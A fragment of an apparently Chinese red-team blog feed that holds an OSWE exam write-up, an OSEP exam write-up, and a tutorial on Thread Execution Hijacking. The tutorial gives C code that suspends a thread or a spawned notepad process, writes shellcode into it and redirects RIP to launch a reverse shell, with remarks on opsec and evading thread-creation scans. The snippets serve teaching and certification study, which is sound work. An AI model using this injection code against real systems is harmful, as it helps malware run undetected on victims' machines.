+<p>和一般CTF Web题目相比，考试环境的代码量肯定是远远超过的，但也远不会像大型CMS那么恐怖。不会出现CTF那种脑洞题，真正的难点在于发现漏洞和将其组合利用起来。</p>
+<p>本来是准备在10月就开始学的，但因为工作太忙，实际上一直拖到了11月才真正开始。</p>
+<p>看了前两章后，我就打算约考试了，结果发现12月只剩两天能预约，其中一个是凌晨两点，所以最后选了12月16号晚八点考试。</p>
+<p>备考思路：</p>
+<ul>
+<li>最好把课程里的练习都做了，包括<code>Extra Mile</code>，每个练习都按照考试的标准写好脚本</li>
+<li>扩展练习：<a href="https://pentesterlab.com/badges/codereview">https://pentesterlab.com/badges/codereview</a>、<a href="https://portswigger.net/web-security/dashboard">https://portswigger.net/web-security/dashboard</a></li>
+<li>和其他OffSec考试一样，有兔子洞，所以需要合理规划时间</li>
+<li>可以列一个漏洞checklist，每种语言常见的漏洞类型，以此为参考，通读代码，逐个测试</li>
+<li>借助Burp插件可以加快脚本编写速度，比如：<a href="https://github.com/silentsignal/burp-requests">burp-requests（将Burp请求转换为Python requests脚本）</a>、<a href="https://github.com/TheKingOfDuck/Copy2Java">Copy2Java（将Burp请求转换为Java代码）</a></li>
+</ul>
+<p>课程材料很有意思，OffSec很详细地讲解了这些漏洞，虽然都是公开的CVE，但他们会从漏洞发掘的思路进行介绍，并辅以各类调试技巧，我觉得对代码审计新手还是非常有帮助的。</p>
+<p>虽然材料中会给出利用脚本来帮助学习，但通常都会留一个地方让你补充完全或修复，这一点挺有趣，避免你直接复制粘贴。</p>
+<p>最后几章的XSS、CSRF、SSRF，讲的漏洞都是OffSec官方发现并提交的，给我的感觉就是炫技，因为不论是挖掘还是利用难度都很高，考试要是出这种百分百做不出来😅</p>
+<p>WEB-300的<code>Challenge</code>只有三个：<code>Answers</code>、<code>DocEdit</code>和<code>Sqeakr</code>，也不用提交flag. 前两个为完全白盒，最后一个需要黑盒先拿到源码再进行审计。</p>
+<p>最后因为时间原因，我来不及完成所有课程练习的自动脚本了，就只写了三个<code>Challenge</code>的，每个<code>Challenge</code>都可以用不止一种路径完成。</p>
+<h1 id="考试">考试</h1>
+<p>考试当天也没心思学习，看了一天的哈利波特电影，快考试时去买了点补给品，还来了杯瑞幸。</p>
+<p>考试开始后，我本来打算在自己的vps直接连考试vpn的，但突然报了个错无法连接，正在排查的时候，监考人员催了我一句“你连上vpn了吗？”，就先用本地连了。后面发现是openvpn版本问题，vps上是2.4.12，需要注释掉<code>data-ciphers</code>和<code>data-ciphers-fallback</code>这两行，而本地kali的openvpn版本是2.6，可以兼容。</p>
+<p>先黑盒看了看，没发现异常，也根据功能列了可能存在的漏洞，然后就开始看代码了。</p>
+<p>上来就遇到个兔子洞，不过没在上面花时间，继续挨个看路由，不到半小时就找到第一个漏洞，验证成功。</p>
+<p>本来信心满满，但随后就陷入了另一个兔子洞，直到凌晨三点我才相信这个思路是走不通的，当时真的是身心俱疲。</p>
+<p>跟监考人员说了我要休息一会，睡到10点起来继续做。这里要批评下自己，配置各类环境的调试很不熟练（我能说是因为只能用VSCode并且没法装新插件么），也浪费了很多时间在上面，最终我是在完全没有断点调试的情况下完成的。</p>
+<p>因为我知道这套代码肯定是有漏洞的，只不过我还没找到而已，所以开始逐个看路由，并记录下所有可能存在漏洞的地方，例如（仅举例，与考试内容没有关系）：</p>
+<ul>
+<li>这里没用预编译，可能有SQL注入</li>
+<li>这里有XML处理，可能有XXE</li>
+<li>这里有文件上传，可能可以传webshell</li>
+<li>……</li>
+</ul>
+<p>记录完后开始逐个排查，终于在一个不太显眼的地方找到了第二个漏洞，并配合第一个漏洞绕过了身份验证。</p>
+<p>而RCE相比而言就简单些了，这里也是一个小技巧，当在找身份验证绕过时，你只需要看那些不需要身份验证以及只需要普通用户权限（能注册用户的前提下）的功能或路由，而找RCE时，只需要看admin权限相关的功能和路由即可。</p>
+<p>第二台同样开头不顺利，但其实考试题目说明里给了一点提示，最终依靠黑盒手法找到了绕过身份认证的漏洞，这里也是经验，黑盒白盒结合起来效率会更高。</p>
+<p>拿到85分已经是考试开始后的24小时了，我大概只睡了5个小时，大脑已经开始转不动了，所以直接选择放弃第二台的RCE，开始测试脚本和编写报告。</p>
+<p>建议在做课程练习和challenge时把代码写的模块化一点，这样需要的时候就可以直接拿来用，不需要再从头编写。</p>
+<p>报告写了30多页（我看到有人说他写了80多页……），最终在凌晨5点完成，反复检查了各部分内容确认无误后，我结束了考试，并直接提交了报告。</p>
+<p>OSWE考试的评分倒是很快，大概在我提交报告（还不是考试结束）的24小时后就收到了邮件，拿到了OSWE：</p>
+<figure data-type="image" tabindex="2"><img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20231220185017yM7W11gbJ4Ya.jpg" alt="20231220185017yM7W11gbJ4Ya" loading="lazy"></figure>
+<h1 id="小结">小结</h1>
+<p>考完后我的感想就是：WEB-300的核心难点仍然是枚举，你需要非常仔细地寻找漏洞所在，与之相比，漏洞的利用反而更简单。</p>
+<p>今年总共拿到了3个OffSec的证书，也算是收获满满，而OSED和OSCE3只能等明年再战了。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Thread Execution Hijacking技术]]></title>
+        <id>https://red-team.tips/post/GrTNvFA7J/</id>
+        <link href="https://red-team.tips/post/GrTNvFA7J/">
+        </link>
+        <updated>2023-09-20T01:40:30.000Z</updated>
+        <content type="html"><![CDATA[<p><a href="https://attack.mitre.org/techniques/T1055/003/">Thread Execution Hijacking</a>是进程注入技术的一个子类，指先暂停或挂起线程，再修改其内存空间，将其替换为恶意代码，最后恢复，达到不创建新线程来执行恶意代码的目的。</p>
+<h1 id="0x1-背景知识">0x1 背景知识</h1>
+<p>线程上下文（Thread Context）包括了线程无缝恢复执行所需的所有信息，包括CPU寄存器、堆栈等。</p>
+<p>线程上下文对应<code>CONTEXT</code>结构，不同的CPU则有不同的结构，具体可以参看<a href="https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-context">CONTEXT structure</a></p>
+<p>这里需要介绍两个Win32 API：</p>
+<ul>
+<li><a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext">GetThreadContext()</a>：获取线程上下文<code>CONTEXT</code>结构</li>
+<li><a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext">SetThreadContext()</a>：将<code>CONTEXT</code>结构填充给指定线程</li>
+</ul>
+<h1 id="0x2-代码实现">0x2 代码实现</h1>
+<p>首先，我们将创建一个新线程并将其挂起或暂停，它的入口是一个正常函数，使用<code>CreateThread()</code>即可实现：</p>
+<pre><code class="language-c">/*void Test()
+{
+    int a = 1;
+    int b = a + 10;
+}*/
+
+HANDLE hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)&amp;Test, NULL, CREATE_SUSPENDED, NULL)
+</code></pre>
+<p>除了在创建进程时设置<code>dwCreationFlags</code>参数外，还可以使用<code>SuspendThread()</code>函数来挂起正常线程。</p>
+<p>之后，需要先将payload拷贝至内存：</p>
+<pre><code class="language-c">PVOID pAddress = VirtualAllic(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+memcpy(pAddress, shellcode, sizeof(shellcode));
+VirtualProtect(pAddress, sizeof(shellcode), PAGE_EXECUTE_READWRITE, NULL);
+</code></pre>
+<p>再获取线程上下文，并修改<code>RIP</code>，使其指向存放payload的位置，并恢复线程：</p>
+<pre><code class="language-c">CONTEXT ThreadCt = {
+        .ContextFlags = CONTEXT_CONTROL
+};
+
+GetThreadContext(hThread, &amp;ThreadCt);
+ThreadCt.Rip = pAddress;
+SetThreadContext(hThread, &amp;ThreadCt);
+ResumeThread(hThread);
+</code></pre>
+<p>这里要注意：调用<code>GetThreadContext()</code>前需要为<code>CONTEXT.ContextFlags</code>赋值，且为了进行线程劫持，该值必须是<code>CONTEXT_CONTROL</code>或<code>CONTEXT_ALL</code>.</p>
+<p>另外，进程的主线程是不能被劫持的，所以我们选择创建一个新线程作为目标。</p>
+<p>实现效果：<br>
+<img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/202309200941193sDcK4To45sr.jpg" alt="202309200941193sDcK4To45sr" loading="lazy"></p>
+<p>可以看到，反向shell已经建立：<br>
+<img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/202309200941319me8b4zlhYVn.jpg" alt="202309200941319me8b4zlhYVn" loading="lazy"></p>
+<h1 id="0x3-拓展">0x3 拓展</h1>
+<p>这里是对本地的线程进行劫持，是否可以劫持远程进程的线程呢？</p>
+<p>也许你会想，可以使用<code>CreateRemoteThread()</code>创建远程进程的线程然后再劫持，但这种操作的opsec不佳，更好的选择是以暂停状态创建一个牺牲进程，并劫持其中的线程。</p>
+<p>使用<code>CreateProcess()</code>可以实现这一点：</p>
+<pre><code class="language-c">BOOL CreateProcessA(
+  [in, optional]      LPCSTR                lpApplicationName, //进程名
+  [in, out, optional] LPSTR                 lpCommandLine, //命令行参数
+  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
+  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
+  [in]                BOOL                  bInheritHandles,
+  [in]                DWORD                 dwCreationFlags, //进程创建标志
+  [in, optional]      LPVOID                lpEnvironment,
+  [in, optional]      LPCSTR                lpCurrentDirectory,
+  [in]                LPSTARTUPINFOA        lpStartupInfo,
+  [out]               LPPROCESS_INFORMATION lpProcessInformation
+);
+</code></pre>
+<p>我们来创建一个记事本进程：</p>
+<pre><code class="language-c">STARTUPINFO Si = { 0 };
+PROCESS_INFORMATION Pi = { 0 };
+
+RtlSecureZeroMemory(&amp;Si, sizeof(STARTUPINFO));
+RtlSecureZeroMemory(&amp;Pi, sizeof(PROCESS_INFORMATION));
+
+Si.cb = sizeof(STARTUPINFO);
+
+CreateProcess(NULL, &quot;C:\\Windows\\System32\\notepad.exe&quot;, NULL, NULL, FALSE, CREATE_SUSPENED, NULL, NULL, &amp;Si, &amp;Pi);
+</code></pre>
+<p>之后将payload注入远程进程，注意这里只是将其写入但不执行：</p>
+<pre><code class="language-c">PVOID pAddress = VirtualAllocEx(Pi.hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+WriteProcessMemory(Pi.hProcess, pAddress, shellcode, sizeof(shellcode), NULL);
+VirtualProtectEx(Pi.hProcess, pAddress, sizeof(shellcode), PAGE_EXECUTE_READWRITE, NULL);
+</code></pre>
+<p>劫持线程的步骤是一样的，只是需要在恢复线程后使用<code>WaitForSingleObject()</code>进行等待。</p>
+<p>效果：<br>
+<img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20230920094203r0funhR43RQx.jpg" alt="20230920094203r0funhR43RQx" loading="lazy"></p>
+<h1 id="0x4-小结">0x4 小结</h1>
+<p>本文简单介绍了线程劫持技术的原理和代码实现，该技术我认为能在一定程度上对抗线程创建扫描，但跟Havoc作者聊了一下：<br>
+<img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20230920094210I4aWcuX1Wbsc.jpg" alt="20230920094210I4aWcuX1Wbsc" loading="lazy"></p>
+<p>有机会测试一下。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[我的OSCE3之路——OSEP]]></title>
+        <id>https://red-team.tips/post/i9wIRUeqw/</id>
+        <link href="https://red-team.tips/post/i9wIRUeqw/">
+        </link>
+        <updated>2023-09-11T09:14:35.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="前言">前言</h1>
+<p><code>OffSec Experienced Pentester (OSEP)</code> 可以看做<code>OSCP</code>的DLC，涵盖的内容实际上是两大块：防御规避和Windows域。</p>
+<p><code>OSCP</code>的Windows域内容比较基础，不涉及委派、ACL滥用、域间信任等内容，<code>OSEP</code>则对其进行了补充，所以这是我的下一个目标。</p>
+<h1 id="课程内容与对比">课程内容与对比</h1>
+<p><code>OSEP</code>对应的课程为<code>PEN-300（Advanced Evasion Techniques and Breaching Defenses）</code>，它并没有像<code>PEN-200（OSCP）</code>那样频繁更新，上次更新可能是2021年，这就导致了其中并不涵盖最新的技术，如<code>ZeroLogon</code>、<code>KrbRelayUp</code>、<code>ADCS</code>利用等，这也是其为人诟病的地方。</p>
+<p>另外，<code>PEN-300</code>中的防御规避技术比较基础（或者叫老旧），所以不要指望单靠这个就能学会实战免杀，尤其是对抗<code>EDR</code>这种环境。</p>
+<p>因为内容的相似性，<code>OSEP</code>常常会被用来和<code>CRTP</code>、<code>CRTO</code>对比。<a href="https://www.alteredsecurity.com/post/certified-red-team-professional-crtp">CRTP</a>我认为要比<code>OSEP</code>的Windows域部分更加深入，而且会更多地教你使用Windows本身的东西来完成攻击（基本靠PowerShell）。</p>
+<p>而<a href="https://training.zeropointsecurity.co.uk/courses/red-team-ops">CRTO</a>的优势在于可以在实验室环境中使用最新版的<code>Cobalt Strike</code>，但更多的是教你如何利用<code>Cobalt Strike</code>完成攻击而不是告诉你具体的原理。另外，<code>CRTO</code>学习材料的内容很少，尤其是与<code>OSEP</code>几百页的PDF相比。</p>
+<p>两者都比<code>OSEP</code>便宜很多，所以看个人选择，我主要是奔着<code>OSCE3</code>去的。</p>
+<p>另外，2021年10月份，<code>OSEP</code>考试被泄露过一次，官方因此重新制作了考试环境，据一些人说，新考试比旧考试要难，<code>Lab</code>中的练习还不够，最好再去<code>HackTheBox ProLabs</code>进行练习，这个看个人选择。</p>
+<h1 id="考试要求">考试要求</h1>
+<p>考试时长为47小时45分钟，结束后同样有24小时的时间来提交报告。</p>
+<p>考试环境模拟一个企业网络，给你一个入口地址，需要先打点（漏洞或钓鱼），之后才能继续进行横向等操作，考试环境具体有多少台机器也是未知的，非官方消息是在20台左右。</p>
+<p>考试通过则需要达成以下两个条件之一：</p>
+<ul>
+<li>拿到100分（每个<code>local.txt</code>或<code>proof.txt</code>为10分）</li>
+<li>拿到<code>secret.txt</code>，具体位置由考试面板提供</li>
+</ul>
+<p>考试限制使用商业工具、chatgpt类问答AI，不限制<code>Metasploit</code>社区版、<code>sqlmap</code>等工具。</p>
+<p><code>OSEP</code>考试并不存在任何奖励分。</p>
+<h1 id="备考">备考</h1>
+<p>课程中的大部分内容我都接触过，所以我读完课程材料大概花了半个月左右，包括做课后练习。有下面几个点需要注意：</p>
+<ol>
+<li><code>OSCP</code>的知识很重要，据朋友说，他在考试中遇到了不少<code>OSCP</code>类型的主机，也就是考验你的枚举和漏洞利用能力，所以我认为，<code>OSEP</code>就是<code>OSCP</code>的大型DLC，一定要扎实地掌握<code>OSCP</code>内的知识。</li>
+<li><code>HackTheBox Pro Labs</code>是比较好的拓展练习，时间和金额充裕可以都做完，如果来不及的话，<code>Cybernetics</code>先做完，这是最贴近<code>OSEP</code>的（虽然多了<code>ADCS</code>的内容）。</li>
+<li>防御规避部分主要涉及：AppLocker、CLM、AMSI、Defender，就按照每台机器都开了所有安全机制来准备相关工具和代码。</li>
+<li>测试防御规避时，按照由简单到复杂的顺序来，例如Word宏钓鱼：<code>下载exe执行 -&gt; VBA Shellcode Loader -&gt; VBA远程加载PowerShell -&gt; ...</code>，每一项手法和代码都在课程环境中测试好，保证考试时没问题。</li>
+<li>和准备<code>OSCP</code>一样，每种攻击都要多学几种方式完成，例如<code>Bypass AppLocker</code>，课程中只教了一个<code>LOLBAS</code>，最好多掌握几个。</li>
+</ol>
+<p>读完材料后，大概在7月27号开始做<code>Lab</code>，也同样是6个<code>challenge</code>，前四个都相当于小的专项练习，域也只是单域，5和6则涉及了多个域，难度也基本上是按照序号来的。<br>
+个人感觉OSEP的<code>Lab</code>要比OSCP有意思得多，在8月11号做完了6个<code>challenge</code>：<br>
+<img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20230911171655VDsbXU4RIWcm.jpg" alt="20230911171655VDsbXU4RIWcm" loading="lazy"><br>
+完成<code>challenge</code>后就买了一个月的<code>HTB ProLabs</code>开始练习，预定了9月7号8:00的考试。</p>
+<p>但<code>HTB ProLabs</code>我没打完，因为环境是共享的，实在是太不稳定了，非常怀念独占的环境，想重置就重置，最后只把wp看了一遍，然后将近20天的时间都没事干，只整理了一下笔记以及可能会用到的代码。</p>
+<p>期间和不少考过试的人请教经验，基本上都说<code>Lab</code>做完不难，但OSCP中的枚举不能忘，像CME、winpeas都要用起来。</p>
+<h1 id="考试">考试</h1>
+<p>当天早上8点开考，这次考前验证步骤熟练了很多，没出现什么情况。</p>
+<p>考试本身难度适中，比<code>Lab</code>略难一点，但没有超过太多，不做<code>HTB ProLabs</code>我觉得也是够的，不过有一点需要注意，一定不要仅仅依赖一种方法或者工具完成某个攻击，万一考试中那个方法用不了就抓瞎了。</p>
+<p>花了12个小时，我拿到了10个flag，但之后花了20个小时都没能拿到新的。<br>
+<img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20230911171721BFn6gBjmiaxL.jpg" alt="20230911171721BFn6gBjmiaxL" loading="lazy"><br>
+最终在9月8号晚上结束考试并提交了报告，报告只写了43页，因为基本上没用自定义代码。</p>
+<p>有个在discord认识的哥们，比我早一天提交，但他第三天就收到了结果，速度还是挺快的。</p>
+<p>为了及时得知自己的考试结果，借用赵今师傅的<a href="https://gist.github.com/glzjin/9464f22ecd83f3de1ede14fea4bc0743">监控脚本</a>，搞了个自动提醒，解放双手，在9月11号凌晨收到了通过的消息：<br>
+<img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20230911171743h8IZ6tYC6SOj.jpg" alt="20230911171743h8IZ6tYC6SOj" loading="lazy"><br>
+<img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20230911171751mWhn1UCxIpdb.jpg" alt="20230911171751mWhn1UCxIpdb" loading="lazy"></p>
+<h1 id="结语">结语</h1>
+<p>总结一下：</p>
+<ul>
+<li>免杀和域都不难，课程里的手法都能过，但尽量准备备用手法，防止意外情况</li>
+<li>熟练使用<code>BloodHound</code>、<code>CrackMapExec</code>、<code>Rubeus</code>等工具</li>
+<li>仍然记住：枚举是关键</li>
+</ul>
+<p>打算休息几天，然后开始<code>OSWE</code>的学习😄</p>
+]]></content>
+    </entry>
+</feed>
